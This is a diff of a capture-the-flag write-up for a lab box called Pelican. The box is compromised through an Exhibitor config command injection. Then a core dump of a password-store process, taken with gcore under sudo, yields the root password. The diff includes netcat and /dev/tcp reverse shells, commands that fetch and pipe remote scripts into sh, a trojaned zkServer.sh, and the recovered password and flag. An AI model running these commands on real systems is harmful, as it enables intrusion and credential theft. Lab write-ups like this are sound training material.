@@ -122,26 +122,54 @@ CUPS Server 1.1 - GET Denial of Service                 | linux/dos/1196.c
 Shellcodes: No Results
 ```
 
-from nmap we know Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+From nmap we know the version of Zookeeper (`3.4.6-1569965 (Built on 02/20/2014)`)
+
+We find an exploit online for CVE-2019-5029.
 
 https://www.exploit-db.com/exploits/48654
 
 > An exploitable command injection vulnerability exists in the Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1. Arbitrary shell commands surrounded by backticks or $() can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper. An attacker can execute any command as the user running the Exhibitor process.
 
+We'll get back to that. For now we look at the webserver on the browser.
+
+Surprise: the root path redirects us the the exhibitor UI.
 
 ![](./assets/zookeper-exhibitor-ui.png)
 
+We read the docs for the exploit and attempt it:
+
+> The steps to exploit it from a web browser:
+>
+>    Open the Exhibitor Web UI and click on the Config tab, then flip the Editing switch to ON
+>
+>    In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:
+>
+>    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
+> 
+>    Click Commit > All At Once > OK
+> 
+>    The command may take up to a minute to execute.
+
+We set up our local listener with `nc -lvnp 4444`, write our shell into the `java.env script` field and press commit...
+
+![](./assets/zookeeper-expl-attempt.png)
+
+![](./assets/commit.png)
+
+![](./assets/commit-all-at-once.png)
+
+![](./assets/post-commit.png)
+
+![](./assets/in-as-charles.png)
+
+
+We find our flag in user `charles`'s home dir:
 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.45.199] from (UNKNOWN) [192.168.164.98] 53012
-whoami
-charles
-```
-
-```
 whoami
 charles
 pwd
@@ -152,6 +180,10 @@ local.txt
 cat local.txt
 399e910d5aecc91538c2073495090194
 ```
+
+Now its time for privilege escalation...
+
+We check for unknown SUID binaries in `/usr/bin`:
 
 ```
 ls -la /usr/bin | grep rws
@@ -172,6 +204,10 @@ ls -la /usr/bin | grep rws
 ls -la /usr/sbin | grep rws
 -rwsr-xr--  1 root dip     386792 Feb 20  2020 pppd
 ```
+
+Note: `password-store` is interesting, not a well-known binary
+
+Check for cron jobs:
 
 ```
 cat /etc/crontab
@@ -201,21 +237,30 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 ```
 
+The `password-store` binary gets invoked on reboot. Also something running `chown` constantly against the `/opt/zookeeper` and `/opt/exhibitor` directories (recursively).
+
+I set up a better shell because the one we have is trash:
+
 ```
 which python
 /usr/bin/python
 python -c 'import pty;pty.spawn("/bin/bash")'
+charles@pelican:~$ 
+```
+
+I run LinPEAS just in case, don't want to miss anything...
+
+```
 charles@pelican:~$ which wget
 which wget
 /usr/bin/wget
 charles@pelican:~$ wget -O- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
+LinPEAS findings:
 
-Findings:
-
-- some interesting cronjobs start on reboot: password-store and something that seems to be constantly changing ownership of zookeeper files(?)
-- can run `gcore`:
+- LinPEAS also raises the `password-store` job as something to look at
+- User `charles` can run `gcore`:
 
 ```
 User charles may run the following commands on pelican:
@@ -224,46 +269,17 @@ Sudoers file: /etc/sudoers.d/charles is readable
 charles ALL=(ALL) NOPASSWD:/usr/bin/gcore
 ```
 
-We'll try to mess with the cron jobs:
+--- 
 
-Inject this java reverse shell into main java
+We'll come back to this in a bit.
 
-```
-Runtime r = Runtime.getRuntime();
-Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
-p.waitFor();
-```
+I noticed that if I reboot the `zookeper` server from the UI, I see some logs:
 
-```
-┌──(kali㉿kali)-[~]
-└─$ python -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.164.98 - - [04/Mar/2024 22:36:23] "GET /ZooKeeperBadMain.java HTTP/1.1" 200 -
-```
+![](./assets/notice-zkserver.png)
 
-```
-charles@pelican:/opt/zookeeper/src/java/main/org/apache/zookeeper$ wget -O ZooKeeperMain.java http://192.168.45.199/ZooKeeperBadMain.java
-<in.java http://192.168.45.199/ZooKeeperBadMain.java               
---2024-03-05 01:36:23--  http://192.168.45.199/ZooKeeperBadMain.java
-Connecting to 192.168.45.199:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 32817 (32K) [text/x-java]
-Saving to: ‘ZooKeeperMain.java’
+There seems to be a shell script (`zkserver.sh`) that runs when we reboot zookeper.
 
-ZooKeeperMain.java  100%[===================>]  32.05K  --.-KB/s    in 0.07s   
-
-2024-03-05 01:36:23 (430 KB/s) - ‘ZooKeeperMain.java’ saved [32817/32817]
-
-charles@pelican:/opt/zookeeper/src/java/main/org/apache/zookeeper$ cat ZooKeeperMain.java | grep 199
-<apache/zookeeper$ cat ZooKeeperMain.java | grep 199               
-	Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/192.168.45.199/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
-```
-
-Now we reboot the machine by introducing a change...
-
-No luck...
-
-The logs tell us `zkServer.sh` is being invoked when zookeeper starts...
+I also know from the cron jobs that user `charles` should have write access to everything under `/opt/zookeeper` and `/opt/exhibitor`. So we'll try setting a reverse shell there just for fun and to see if we learn anything:
 
 ```
 charles@pelican:/opt/zookeeper/bin$ ls -la
@@ -281,7 +297,9 @@ drwxr-xr-x 12 charles charles 4096 Mar  5 01:06 ..
 -rwxr-xr-x  1 charles charles 5742 Feb 20  2014 zkServer.sh
 ```
 
-We can write to it. Let's try reverse shell and hope to get root.
+Let's try reverse shell.
+
+I serve the modified version of the script (which contains a python reverse shell) from my Kali machine, which I get with wget and replace the file in the target server.
 
 ```
 charles@pelican:/opt/zookeeper/bin$ wget -O zkServer.sh http://192.168.45.199/zkServerBad.sh
@@ -306,6 +324,14 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.164.98 - - [04/Mar/2024 22:48:33] "GET /zkServerBad.sh HTTP/1.1" 200 -
 ```
 
+I reboot the server with the button on the UI:
+
+![](./assets/reboot.png)
+
+![](./assets/restart-after-modify-zkserver)
+
+We get a shell... as `charles`...
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4242
@@ -315,21 +341,9 @@ whoami
 charles
 ```
 
-Can't get root... tried a bunch of times, different languages, setting uid 0, etc.
+I did try to set the uid to 0 in the python shell, hoping for the best, but no luck. Can't get root this way.
 
-Back to LinPEAS results... we can run `gcore` as root and generate core dumps... sounds like a long shot, but let's try that on that `password-store` process that get's kicked off on reboot.
-
-```
-charles@pelican:/opt/zookeeper$ sudo -l
-sudo -l
-Matching Defaults entries for charles on pelican:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User charles may run the following commands on pelican:
-    (ALL) NOPASSWD: /usr/bin/gcore
-```
-
+Back to LinPEAS results... we can run `gcore` as root. I read about `gcore` online and its a tool used to generate core dumps... sounds like a long shot, but let's try that on that `password-store` process that get's kicked off on reboot.
 
 ```
 charles@pelican:/opt/zookeeper$ gcore 
@@ -366,7 +380,11 @@ _=/bin/nc
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 INVOCATION_ID=01ab10c8340c4e44a125c89fa57242bd
 LANG=en_US.UTF-8
+```
 
+The core dump has a password. Let's try it against `root`:
+
+```
 charles@pelican:/opt/zookeeper$ su root
 su root
 Password: ClogKingpinInning731
